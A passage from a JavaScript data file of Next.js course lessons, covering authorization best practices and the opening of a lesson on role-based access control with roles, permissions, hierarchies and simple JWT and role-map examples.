            content: "Manager:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Approve loans"
            ]
          },
          {
            type: "paragraph",
            content: "Auditor:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Read reports only"
            ]
          },
          {
            type: "paragraph",
            content: "Compliance officer:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Freeze accounts"
            ]
          },
          {
            type: "paragraph",
            content: "Each role receives carefully controlled permissions."
          }
        ]
      },
      {
        heading: "Security Considerations",
        blocks: [
          {
            type: "paragraph",
            content: "Authorization failures are one of the most dangerous security vulnerabilities."
          },
          {
            type: "paragraph",
            content: "Always remember:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Never trust the frontend.",
              "Hide data on the server, not just the UI.",
              "Validate every request.",
              "Protect every API endpoint.",
              "Check ownership before modifying resources.",
              "Use least-privilege access.",
              "Audit permission changes.",
              "Log authorization failures."
            ]
          },
          {
            type: "paragraph",
            content: "A hidden button is not security."
          },
          {
            type: "paragraph",
            content: "Even if a user cannot see the Delete button, they might still call the API manually."
          },
          {
            type: "paragraph",
            content: "Always enforce authorization on the server."
          }
        ]
      },
      {
        heading: "Production Best Practices",
        blocks: [
          {
            type: "list",
            style: "unordered",
            items: [
              "Authenticate before authorizing.",
              "Use server-side authorization checks.",
              "Prefer permission-based systems over hardcoded role checks.",
              "Centralize authorization logic in reusable helpers or policies.",
              "Follow the Principle of Least Privilege—grant only the minimum permissions required.",
              "Validate ownership for user-generated resources.",
              "Separate authentication logic from authorization logic.",
              "Keep roles simple, but permissions granular.",
              "Log denied access attempts for auditing.",
              "Test authorization rules thoroughly."
            ]
          }
        ]
      },
      {
        heading: "Common Mistakes",
        blocks: [
          {
            type: "list",
            style: "unordered",
            items: [
              "Assuming authentication equals authorization.",
              "Checking permissions only in the UI.",
              "Trusting values sent by the client.",
              "Hardcoding \"admin\" checks throughout the codebase.",
              "Returning sensitive data before verifying permissions.",
              "Forgetting authorization on API routes.",
              "Ignoring ownership validation.",
              "Giving users more permissions than necessary.",
              "Mixing business logic with authorization logic."
            ]
          }
        ]
      },
      {
        heading: "DevSphere Special Note",
        blocks: [
          {
            type: "note",
            content: "As applications grow, authorization becomes one of the most complex parts of backend development. A startup may begin with simple role checks like if (user.role === \"admin\"), but enterprise systems often evolve to policy-based or attribute-based authorization with hundreds of permissions and contextual rules.\n\nDesign your authorization system to be extensible from the start. Keep permission checks centralized, store authorization metadata consistently, and avoid scattering logic across components and API handlers. A well-designed authorization layer makes applications easier to maintain, audit, and secure as they scale."
          }
        ]
      },
      {
        heading: "Summary",
        blocks: [
          {
            type: "paragraph",
            content: "Authorization determines what an authenticated user is allowed to do. While authentication establishes identity, authorization enforces permissions by evaluating users, resources, actions, ownership, and policies. Modern Next.js applications typically implement authorization on the server using Server Components, Route Handlers, Middleware, or Server Actions, ensuring that sensitive data and operations remain protected regardless of what happens on the client."
          },
          {
            type: "paragraph",
            content: "In this lesson, you learned:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "The difference between authentication and authorization",
              "Why access control is essential",
              "Users, resources, actions, and permissions",
              "Ownership-based authorization",
              "Resource-, permission-, and policy-based authorization",
              "Attribute-Based Access Control (ABAC)",
              "Context-aware authorization",
              "The authorization lifecycle",
              "API and database authorization",
              "Production security practices",
              "Common implementation mistakes"
            ]
          },
          {
            type: "paragraph",
            content: "With these concepts mastered, you're ready to build secure authorization systems that scale from small applications to enterprise-grade platforms."
          }
        ]
      }
    ]
  },




  /* ===========================
    Seventh Topic : Role-Based Access Control
============================= */
    "nextjs-role-based-access-control": {
    title: "Role-Based Access Control",
    readingTime: "30 min",
        
    content: [
      {
        heading: "Role-Based Access Control (RBAC) - Part 1",
        blocks: [
          {
            type: "paragraph",
            content: "In previous lessons, we learned how to authenticate users and authorize requests. Authentication answers \"Who are you?\", while authorization answers \"What are you allowed to do?\""
          },
          {
            type: "paragraph",
            content: "However, in real-world applications with hundreds or even millions of users, manually assigning permissions to every individual user becomes impossible."
          },
          {
            type: "paragraph",
            content: "Imagine managing permissions for:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "A university portal with 100,000 students",
              "An e-commerce platform with thousands of employees",
              "A hospital management system",
              "A banking application",
              "GitHub",
              "YouTube",
              "Google Workspace"
            ]
          },
          {
            type: "paragraph",
            content: "Giving permissions one user at a time would quickly become a nightmare."
          },
          {
            type: "paragraph",
            content: "This is exactly why Role-Based Access Control (RBAC) was created."
          },
          {
            type: "paragraph",
            content: "Instead of assigning permissions directly to users, RBAC assigns permissions to roles, and users inherit permissions from their assigned roles."
          },
          {
            type: "paragraph",
            content: "This makes applications easier to manage, more secure, and much more scalable."
          }
        ]
      },
      {
        heading: "What is Role-Based Access Control (RBAC)?",
        blocks: [
          {
            type: "paragraph",
            content: "Role-Based Access Control (RBAC) is an authorization model where users receive permissions through predefined roles rather than individual permission assignments."
          },
          {
            type: "paragraph",
            content: "Instead of saying:"
          },
          {
            type: "output",
            content: [
              "User John can edit products."
            ]
          },
          {
            type: "paragraph",
            content: "RBAC says:"
          },
          {
            type: "output",
            content: [
              "John is an Editor.",
              "",
              "Editors can edit products."
            ]
          },
          {
            type: "paragraph",
            content: "John automatically receives that permission."
          },
          {
            type: "paragraph",
            content: "The permission belongs to the role, not the individual user."
          }
        ]
      },
      {
        heading: "Simple analogy",
        blocks: [
          {
            type: "paragraph",
            content: "Think about a company."
          },
          {
            type: "paragraph",
            content: "There are many employees."
          },
          {
            type: "paragraph",
            content: "Instead of telling every employee individually:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "You may access HR documents.",
              "You may approve expenses.",
              "You may hire employees.",
              "You may create invoices."
            ]
          },
          {
            type: "paragraph",
            content: "The company creates job positions:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Intern",
              "Developer",
              "Manager",
              "HR",
              "CEO"
            ]
          },
          {
            type: "paragraph",
            content: "Each position automatically includes specific responsibilities."
          },
          {
            type: "paragraph",
            content: "Employees simply receive a position."
          },
          {
            type: "paragraph",
            content: "Exactly the same concept is used in RBAC."
          }
        ]
      },
      {
        heading: "Why RBAC Exists",
        blocks: [
          {
            type: "paragraph",
            content: "Before RBAC, many systems used Direct Permission Assignment."
          },
          {
            type: "paragraph",
            content: "For example:"
          },
          {
            type: "paragraph",
            content: "John"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "✓ Read Posts",
              "✓ Write Posts",
              "✓ Delete Posts",
              "✓ Approve Comments"
            ]
          },
          {
            type: "paragraph",
            content: "Alice"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "✓ Read Posts",
              "✓ Upload Images"
            ]
          },
          {
            type: "paragraph",
            content: "Bob"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "✓ Read Posts",
              "✓ Delete Users",
              "✓ Create Roles"
            ]
          },
          {
            type: "paragraph",
            content: "Initially, this looks manageable."
          },
          {
            type: "paragraph",
            content: "But imagine:"
          },
          {
            type: "output",
            content: [
              "10 employees",
              "",
              "50 permissions"
            ]
          },
          {
            type: "paragraph",
            content: "Still okay."
          },
          {
            type: "paragraph",
            content: "Now imagine:"
          },
          {
            type: "output",
            content: [
              "10,000 employees",
              "",
              "500 permissions"
            ]
          },
          {
            type: "paragraph",
            content: "Now every employee has different permission combinations."
          },
          {
            type: "paragraph",
            content: "Managing this manually becomes almost impossible."
          }
        ]
      },
      {
        heading: "Problems without RBAC",
        blocks: [
          {
            type: "paragraph",
            content: "Without roles, organizations face several challenges."
          },
          {
            type: "paragraph",
            content: "1. Permission Explosion"
          },
          {
            type: "paragraph",
            content: "Every user has unique permissions."
          },
          {
            type: "table",
            headers: ["User", "Permissions"],
            rows: [
              ["User A", "20 permissions"],
              ["User B", "18 permissions"],
              ["User C", "35 permissions"],
              ["User D", "41 permissions"]
            ]
          },
          {
            type: "paragraph",
            content: "Soon every account becomes different."
          },
          {
            type: "paragraph",
            content: "No one knows what permissions users actually have."
          },
          {
            type: "paragraph",
            content: "2. Difficult Maintenance"
          },
          {
            type: "paragraph",
            content: "Suppose your company hires 300 new customer support agents."
          },
          {
            type: "paragraph",
            content: "Without RBAC:"
          },
          {
            type: "paragraph",
            content: "You manually assign:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "View Tickets",
              "Reply Tickets",
              "Close Tickets",
              "Escalate Tickets"
            ]
          },
          {
            type: "paragraph",
            content: "to all 300 users."
          },
          {
            type: "paragraph",
            content: "Later you decide support agents should also:"
          },
          {
            type: "output",
            content: [
              "Refund orders"
            ]
          },
          {
            type: "paragraph",
            content: "Now you must update all 300 accounts individually."
          },
          {
            type: "paragraph",
            content: "3. Human Errors"
          },
          {
            type: "paragraph",
            content: "Administrators forget permissions."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "paragraph",
            content: "Alice"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "✓ Read Orders",
              "✓ Delete Orders",
              "✓ Manage Users"
            ]
          },
          {
            type: "paragraph",
            content: "She should never have Delete Orders permission."
          },
          {
            type: "paragraph",
            content: "One mistake may expose confidential data."
          },
          {
            type: "paragraph",
            content: "4. Security Risks"
          },
          {
            type: "paragraph",
            content: "Old employees may retain permissions after changing departments."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "flow",
            steps: [
              "Developer promoted to Manager.", "→",
              "Old permissions remain.", "→",
              "New permissions added.", "→",
              "Now the employee has excessive access."
            ]
          },
          {
            type: "paragraph",
            content: "This violates the Principle of Least Privilege, increasing the risk of accidental or malicious misuse."
          },
          {
            type: "paragraph",
            content: "5. Poor Scalability"
          },
          {
            type: "paragraph",
            content: "Applications constantly evolve."
          },
          {
            type: "paragraph",
            content: "New features mean:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "New APIs",
              "New dashboards",
              "New databases",
              "New reports"
            ]
          },
          {
            type: "paragraph",
            content: "Without RBAC, every permission update requires editing thousands of user accounts."
          }
        ]
      },
      {
        heading: "How RBAC Solves These Problems",
        blocks: [
          {
            type: "paragraph",
            content: "RBAC introduces an intermediate layer."
          },
          {
            type: "paragraph",
            content: "Instead of:"
          },
          {
            type: "flow",
            steps: [
              "User", "→",
              "Permissions"
            ]
          },
          {
            type: "paragraph",
            content: "we create:"
          },
          {
            type: "flow",
            steps: [
              "User", "→",
              "Role", "→",
              "Permissions"
            ]
          },
          {
            type: "paragraph",
            content: "Now permissions belong to roles."
          },
          {
            type: "paragraph",
            content: "Users inherit them automatically."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "tree",
            content: `Admin
├── Create Users
├── Delete Users
├── Edit Products
├── View Analytics

Editor
├── Create Articles
├── Edit Articles

Viewer
├── Read Articles`
          },
          {
            type: "paragraph",
            content: "Users simply receive one of these roles."
          }
        ]
      },
      {
        heading: "Core Building Blocks of RBAC",
        blocks: [
          {
            type: "paragraph",
            content: "RBAC consists of three primary entities:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Users",
              "Roles",
              "Permissions"
            ]
          },
          {
            type: "paragraph",
            content: "Everything revolves around these three concepts."
          },
          {
            type: "paragraph",
            content: "Let's understand each in detail."
          }
        ]
      },
      {
        heading: "Users",
        blocks: [
          {
            type: "paragraph",
            content: "A User represents a person, system, or application that wants to access protected resources."
          },
          {
            type: "paragraph",
            content: "Examples:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Customer",
              "Employee",
              "Student",
              "Administrator",
              "Teacher",
              "Vendor",
              "API Consumer",
              "Mobile App"
            ]
          },
          {
            type: "paragraph",
            content: "A user typically has identity information such as:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "id",
              "name",
              "email",
              "password hash",
              "role"
            ]
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "code",
            language: "json",
            content: `{
  "id": 7,
  "name": "John",
  "email": "john@example.com",
  "role": "editor"
}`
          },
          {
            type: "paragraph",
            content: "Notice that the user does not store individual permissions."
          },
          {
            type: "paragraph",
            content: "Instead, it stores a reference to a role."
          }
        ]
      },
      {
        heading: "Users in Next.js",
        blocks: [
          {
            type: "paragraph",
            content: "After login:"
          },
          {
            type: "code",
            language: "javascript",
            content: `const session = {
  user: {
    id: 1,
    name: "John",
    role: "admin",
  },
};`
          },
          {
            type: "paragraph",
            content: "Every request now carries the user's identity and role."
          },
          {
            type: "paragraph",
            content: "The application can determine what this user is allowed to do."
          }
        ]
      },
      {
        heading: "Roles",
        blocks: [
          {
            type: "paragraph",
            content: "A Role is a named collection of permissions."
          },
          {
            type: "paragraph",
            content: "Examples include:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Admin",
              "Editor",
              "Customer",
              "Moderator",
              "Teacher",
              "Student",
              "Seller",
              "Buyer",
              "Manager",
              "HR"
            ]
          },
          {
            type: "paragraph",
            content: "Roles represent job responsibilities, not people."
          },
          {
            type: "paragraph",
            content: "For example:"
          },
          {
            type: "output",
            content: [
              "Editor"
            ]
          },
          {
            type: "paragraph",
            content: "may have:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Read Articles",
              "Create Articles",
              "Edit Articles",
              "Publish Articles"
            ]
          },
          {
            type: "paragraph",
            content: "Anyone assigned the Editor role receives those permissions automatically."
          }
        ]
      },
      {
        heading: "Example",
        blocks: [
          {
            type: "paragraph",
            content: "Instead of:"
          },
          {
            type: "paragraph",
            content: "John"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Read",
              "Write",
              "Delete"
            ]
          },
          {
            type: "paragraph",
            content: "Store:"
          },
          {
            type: "flow",
            steps: [
              "John", "→",
              "Editor"
            ]
          },
          {
            type: "paragraph",
            content: "Editor defines the permissions."
          },
          {
            type: "paragraph",
            content: "Much simpler."
          }
        ]
      },
      {
        heading: "Good Role Design",
        blocks: [
          {
            type: "paragraph",
            content: "Good roles represent business responsibilities."
          },
          {
            type: "paragraph",
            content: "Examples:"
          },
          {
            type: "paragraph",
            content: "E-commerce"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Customer",
              "Seller",
              "Warehouse Staff",
              "Support Agent",
              "Manager",
              "Admin"
            ]
          },
          {
            type: "paragraph",
            content: "Hospital"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Doctor",
              "Nurse",
              "Receptionist",
              "Lab Technician",
              "Patient"
            ]
          },
          {
            type: "paragraph",
            content: "University"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Student",
              "Professor",
              "Department Head",
              "Registrar",
              "Admin"
            ]
          },
          {
            type: "paragraph",
            content: "Roles should describe what someone does, not who they are."
          }
        ]
      },
      {
        heading: "Too Many Roles Can Become a Problem",
        blocks: [
          {
            type: "paragraph",
            content: "Avoid creating roles for every tiny variation."
          },
          {
            type: "paragraph",
            content: "Bad example:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "SeniorEditor",
              "JuniorEditor",
              "NightEditor",
              "WeekendEditor",
              "EditorLevel2",
              "EditorLevel3"
            ]
          },
          {
            type: "paragraph",
            content: "Instead:"
          },
          {
            type: "output",
            content: [
              "Editor"
            ]
          },
          {
            type: "paragraph",
            content: "combined with permissions or attributes is often enough."
          }
        ]
      },
      {
        heading: "Permissions",
        blocks: [
          {
            type: "paragraph",
            content: "A Permission is the smallest unit of access control."
          },
          {
            type: "paragraph",
            content: "It answers:"
          },
          {
            type: "output",
            content: [
              "What action is allowed?"
            ]
          },
          {
            type: "paragraph",
            content: "Examples:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Create Product",
              "Delete Product",
              "Edit Product",
              "View Orders",
              "Delete Users",
              "Publish Posts",
              "Manage Roles"
            ]
          },
          {
            type: "paragraph",
            content: "A permission usually consists of:"
          },
          {
            type: "output",
            content: [
              "Resource + Action"
            ]
          },
          {
            type: "paragraph",
            content: "For example:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Products:Create",
              "Products:Delete",
              "Users:Update",
              "Orders:Read"
            ]
          },
          {
            type: "paragraph",
            content: "This naming convention makes permissions consistent across large applications."
          }
        ]
      },
      {
        heading: "Examples",
        blocks: [
          {
            type: "paragraph",
            content: "Instead of vague permissions like:"
          },
          {
            type: "output",
            content: [
              "Manage"
            ]
          },
          {
            type: "paragraph",
            content: "Use descriptive names:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "users.read",
              "users.create",
              "users.update",
              "users.delete",
              "orders.read",
              "orders.refund",
              "products.publish"
            ]
          },
          {
            type: "paragraph",
            content: "This approach is far easier to understand and maintain."
          }
        ]
      },
      {
        heading: "Permission Granularity",
        blocks: [
          {
            type: "paragraph",
            content: "Permissions can be coarse-grained or fine-grained."
          },
          {
            type: "paragraph",
            content: "Coarse-grained"
          },
          {
            type: "output",
            content: [
              "Manage Products"
            ]
          },
          {
            type: "paragraph",
            content: "Simple but less flexible."
          },
          {
            type: "paragraph",
            content: "Fine-grained"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Create Product",
              "Edit Product",
              "Delete Product",
              "Publish Product",
              "Archive Product"
            ]
          },
          {
            type: "paragraph",
            content: "Much more flexible."
          },
          {
            type: "paragraph",
            content: "Most production systems favor fine-grained permissions because they provide better control."
          }
        ]
      },
      {
        heading: "Access Relationships",
        blocks: [
          {
            type: "paragraph",
            content: "RBAC is fundamentally about relationships between users, roles, and permissions."
          },
          {
            type: "paragraph",
            content: "The flow is:"
          },
          {
            type: "flow",
            steps: [
              "User", "→",
              "belongs to", "→",
              "Role", "→",
              "contains", "→",
              "Permissions"
            ]
          },
          {
            type: "paragraph",
            content: "For example:"
          },
          {
            type: "flow",
            steps: [
              "John", "→",
              "Editor", "→",
              "Read Articles\n\nEdit Articles\n\nPublish Articles"
            ]
          },
          {
            type: "paragraph",
            content: "John never receives permissions directly."
          },
          {
            type: "paragraph",
            content: "He inherits them from the Editor role."
          }
        ]
      },
      {
        heading: "Multiple Users",
        blocks: [
          {
            type: "code",
            language: "text",
            content: `Alice
      \\
Bob ----> Editor
      /
Charlie`
          },
          {
            type: "paragraph",
            content: "All three users inherit the same permissions."
          },
          {
            type: "paragraph",
            content: "If you later update the Editor role, every assigned user immediately receives the new permissions."
          }
        ]
      },
      {
        heading: "Multiple Roles",
        blocks: [
          {
            type: "paragraph",
            content: "Some systems allow users to have more than one role."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "output",
            content: [
              "John",
              "",
              "Developer",
              "",
              "Moderator"
            ]
          },
          {
            type: "paragraph",
            content: "Permissions become the union of both roles."
          },
          {
            type: "tree",
            content: `Developer
├── Push Code

Moderator
├── Delete Comments`
          },
          {
            type: "paragraph",
            content: "John now has:"
          },
          {
            type: "output",
            content: [
              "Push Code",
              "",
              "Delete Comments"
            ]
          },
          {
            type: "paragraph",
            content: "This approach is useful but should be managed carefully to avoid granting excessive privileges."
          }
        ]
      },
      {
        heading: "Permission Assignment Flow",
        blocks: [
          {
            type: "flow",
            steps: [
              "Administrator", "→",
              "Creates Role", "→",
              "Assigns Permissions", "→",
              "Assigns Role", "→",
              "User Logs In", "→",
              "Application Loads Role", "→",
              "Permissions Become Available"
            ]
          },
          {
            type: "paragraph",
            content: "This separation makes administration significantly easier."
          }
        ]
      },
      {
        heading: "Real-world Examples",
        blocks: [
          {
            type: "paragraph",
            content: "Example 1: Blog Platform"
          },
          {
            type: "paragraph",
            content: "Users:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "John",
              "Alice",
              "Bob"
            ]
          },
          {
            type: "paragraph",
            content: "Roles:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Author",
              "Editor",
              "Admin"
            ]
          },
          {
            type: "paragraph",
            content: "Permissions:"
          },
          {
            type: "paragraph",
            content: "Author"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Write Posts",
              "Edit Own Posts"
            ]
          },
          {
            type: "paragraph",
            content: "Editor"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Review Posts",
              "Publish Posts",
              "Edit Any Post"
            ]
          },
          {
            type: "paragraph",
            content: "Admin"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Manage Users",
              "Delete Posts",
              "Manage Roles",
              "Site Settings"
            ]
          },
          {
            type: "paragraph",
            content: "Workflow:"
          },
          {
            type: "paragraph",
            content: "John joins as an Author. Later, he is promoted to Editor. Instead of assigning new permissions individually, you simply change his role."
          },
          {
            type: "paragraph",
            content: "Example 2: E-commerce Platform"
          },
          {
            type: "paragraph",
            content: "Roles:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Customer",
              "Seller",
              "Support",
              "Warehouse",
              "Finance",
              "Admin"
            ]
          },
          {
            type: "paragraph",
            content: "Customer"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "View Products",
              "Place Orders",
              "Track Orders"
            ]
          },
          {
            type: "paragraph",
            content: "Seller"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Create Products",
              "Update Inventory",
              "View Sales"
            ]
          },
          {
            type: "paragraph",
            content: "Warehouse"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Manage Inventory",
              "Ship Orders"
            ]
          },
          {
            type: "paragraph",
            content: "Support"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "View Customers",
              "Refund Orders",
              "Resolve Tickets"
            ]
          },
          {
            type: "paragraph",
            content: "Each department only accesses the resources necessary for its responsibilities."
          },
          {
            type: "paragraph",
            content: "Example 3: University Portal"
          },
          {
            type: "paragraph",
            content: "Roles:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Student",
              "Professor",
              "Registrar",
              "Admin"
            ]
          },
          {
            type: "paragraph",
            content: "Student"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "View Courses",
              "Submit Assignments",
              "View Grades"
            ]
          },
          {
            type: "paragraph",
            content: "Professor"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Grade Students",
              "Create Assignments",
              "Manage Courses"
            ]
          },
          {
            type: "paragraph",
            content: "Registrar"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Manage Enrollment",
              "Generate Transcripts"
            ]
          },
          {
            type: "paragraph",
            content: "Admin"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Manage Users",
              "Manage Departments",
              "Manage Entire System"
            ]
          },
          {
            type: "paragraph",
            content: "A professor cannot access registrar functions, and a student cannot modify grades."
          },
          {
            type: "paragraph",
            content: "Example 4: GitHub"
          },
          {
            type: "paragraph",
            content: "Although GitHub uses a more advanced authorization model, RBAC principles are still visible."
          },
          {
            type: "paragraph",
            content: "Repository roles include:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Read",
              "Triage",
              "Write",
              "Maintain",
              "Admin"
            ]
          },
          {
            type: "paragraph",
            content: "Each role grants a predefined set of capabilities, allowing repository owners to control collaboration without assigning individual permissions one by one."
          }
        ]
      },
      {
        heading: "Why Modern Applications Prefer RBAC",
        blocks: [
          {
            type: "paragraph",
            content: "Nearly every enterprise application—including banking systems, cloud platforms, CRMs, ERPs, learning management systems, and content management systems—uses RBAC or an extension of it because it offers:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Scalability: Manage permissions for millions of users through a small set of roles.",
              "Consistency: Users with the same responsibilities receive identical access.",
              "Maintainability: Update a role once, and every assigned user inherits the change.",
              "Security: Supports the Principle of Least Privilege by granting only the permissions required for a role.",
              "Auditability: It's much easier to review what access each role provides than to inspect permissions for every individual account."
            ]
          }
        ]
      },
      {
        heading: "Key Takeaway",
        blocks: [
          {
            type: "paragraph",
            content: "RBAC is not just a programming concept—it's a foundational security model used across operating systems, cloud platforms, enterprise software, and modern web applications. By introducing the User → Role → Permission relationship, it transforms authorization from a complex, error-prone task into a scalable and manageable system that can grow with your application."
          },
          {
            type: "divider"
          }
        ]
      },

      {
        heading: "Role Hierarchy",
        blocks: [
          {
            type: "paragraph",
            content: "As applications grow, managing permissions for every individual user quickly becomes impossible. Imagine an organization with 20,000 employees. If each employee's permissions were assigned manually, maintaining access would become a nightmare."
          },
          {
            type: "paragraph",
            content: "This is why Role-Based Access Control (RBAC) introduces the concept of a role hierarchy."
          },
          {
            type: "paragraph",
            content: "Instead of assigning permissions directly to users, permissions are grouped into roles, and roles themselves can inherit permissions from higher or lower roles."
          },
          {
            type: "paragraph",
            content: "Role hierarchy creates an organized permission structure that mirrors the organization's hierarchy."
          }
        ]
      },
      {
        heading: "Role Hierarchy Example",
        blocks: [
          {
            type: "flow",
            steps: [
              "Super Admin", "→",
              "Admin", "→",
              "Manager", "→",
              "Editor", "→",
              "Author", "→",
              "User"
            ]
          },
          {
            type: "paragraph",
            content: "Each role automatically receives the permissions of lower roles unless explicitly restricted."
          },
          {
            type: "paragraph",
            content: "For example:"
          },
          {
            type: "tree",
            content: `User
 ├── View Products
 ├── Edit Profile

Author
 ├── Everything User can do
 ├── Create Articles

Editor
 ├── Everything Author can do
 ├── Publish Articles
 ├── Delete Articles

Manager
 ├── Everything Editor can do
 ├── Manage Teams

Admin
 ├── Everything Manager can do
 ├── Manage Users
 ├── Manage Roles

Super Admin
 ├── Everything Admin can do
 ├── System Configuration
 ├── Billing
 ├── Infrastructure`
          },
          {
            type: "paragraph",
            content: "Notice how every higher-level role gains all capabilities of the lower levels."
          }
        ]
      },
      {
        heading: "Why Role Hierarchies Exist",
        blocks: [
          {
            type: "paragraph",
            content: "Without hierarchies, permission duplication becomes enormous."
          },
          {
            type: "paragraph",
            content: "Imagine an application with:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "180 permissions",
              "12 roles"
            ]
          },
          {
            type: "paragraph",
            content: "Without inheritance:"
          },
          {
            type: "output",
            content: [
              "Admin",
              "View Dashboard",
              "View Reports",
              "Create Users",
              "Delete Users",
              "Edit Users",
              "Export Reports",
              "Manage Teams",
              "...",
              "180 permissions"
            ]
          },
          {
            type: "paragraph",
            content: "Manager would again require copying many of these permissions."
          },
          {
            type: "paragraph",
            content: "Editor would require another copy."
          },
          {
            type: "paragraph",
            content: "Author would require another copy."
          },
          {
            type: "paragraph",
            content: "The same permission may appear dozens of times."
          },
          {
            type: "paragraph",
            content: "Updating permissions becomes difficult because changing one permission requires updating every role individually."
          },
          {
            type: "paragraph",
            content: "Role hierarchies solve this by allowing inheritance."
          },
          {
            type: "code",
            language: "text",
            content: `User
 ↑
Author
 ↑
Editor
 ↑
Manager
 ↑
Admin`
          },
          {
            type: "paragraph",
            content: "Permission changes automatically flow through the hierarchy."
          }
        ]
      },
      {
        heading: "Types of Role Hierarchies",
        blocks: [
          {
            type: "paragraph",
            content: "There are several hierarchy models."
          },
          {
            type: "paragraph",
            content: "1. Linear Hierarchy"
          },
          {
            type: "paragraph",
            content: "Every role inherits from exactly one parent."
          },
          {
            type: "code",
            language: "text",
            content: `User
 ↑
Moderator
 ↑
Admin
 ↑
Super Admin`
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Simple.",
              "Easy to understand.",
              "Perfect for small applications."
            ]
          },
          {
            type: "paragraph",
            content: "2. Tree Hierarchy"
          },
          {
            type: "paragraph",
            content: "Large companies usually organize departments separately."
          },
          {
            type: "code",
            language: "text",
            content: `              Super Admin
             /           \\
      HR Admin       Engineering Admin
        /                 \\
 HR Manager          Tech Lead
      |                  |
 HR Staff          Software Engineer`
          },
          {
            type: "paragraph",
            content: "Different departments have different permissions while still belonging to one organization."
          },
          {
            type: "paragraph",
            content: "3. Multiple Inheritance"
          },
          {
            type: "paragraph",
            content: "Some roles inherit permissions from multiple parents."
          },
          {
            type: "code",
            language: "text",
            content: `                Project Manager
              /                \\
         Developer         Product Owner
                 \\         /
                Team Lead`
          },
          {
            type: "paragraph",
            content: "Team Lead receives permissions from both Developer and Product Owner."
          },
          {
            type: "paragraph",
            content: "Although powerful, this approach increases complexity and should be designed carefully to avoid conflicts."
          }
        ]
      },
      {
        heading: "Designing a Good Hierarchy",
        blocks: [
          {
            type: "paragraph",
            content: "A good hierarchy should follow these principles:"
          },
          {
            type: "paragraph",
            content: "Higher roles should never lose lower permissions"
          },
          {
            type: "paragraph",
            content: "❌ Bad"
          },
          {
            type: "output",
            content: [
              "Admin",
              "Can delete users",
              "",
              "Manager",
              "Cannot view dashboard"
            ]
          },
          {
            type: "paragraph",
            content: "Managers should not have fewer permissions than Users unless explicitly required."
          },
          {
            type: "paragraph",
            content: "Keep inheritance simple"
          },
          {
            type: "paragraph",
            content: "Avoid deeply nested hierarchies."
          },
          {
            type: "flow",
            steps: [
              "CEO", "→",
              "Director", "→",
              "VP", "→",
              "Senior Manager", "→",
              "Manager", "→",
              "Assistant Manager", "→",
              "Lead", "→",
              "Senior Developer", "→",
              "Developer", "→",
              "Intern"
            ]
          },
          {
            type: "paragraph",
            content: "Ten levels become difficult to maintain."
          },
          {
            type: "paragraph",
            content: "Instead:"
          },
          {
            type: "output",
            content: [
              "Admin",
              "",
              "Manager",
              "",
              "Employee",
              "",
              "Guest"
            ]
          },
          {
            type: "paragraph",
            content: "Simple structures are easier to audit and understand."
          },
          {
            type: "paragraph",
            content: "Follow the Principle of Least Privilege"
          },
          {
            type: "paragraph",
            content: "Every role should receive only the permissions necessary to perform its job."
          },
          {
            type: "paragraph",
            content: "Never grant unnecessary access simply because it is convenient."
          }
        ]
      },
      {
        heading: "Role Hierarchy in Next.js",
        blocks: [
          {
            type: "paragraph",
            content: "Suppose your JWT contains:"
          },
          {
            type: "code",
            language: "json",
            content: `{
    "id": 25,
    "role": "admin"
}`
          },
          {
            type: "paragraph",
            content: "Middleware can define the hierarchy:"
          },
          {
            type: "code",
            language: "javascript",
            content: `const hierarchy = {
    user: 1,
    author: 2,
    editor: 3,
    manager: 4,
    admin: 5,
    superadmin: 6
};`
          },
          {
            type: "paragraph",
            content: "Checking access becomes straightforward:"
          },
          {
            type: "code",
            language: "javascript",
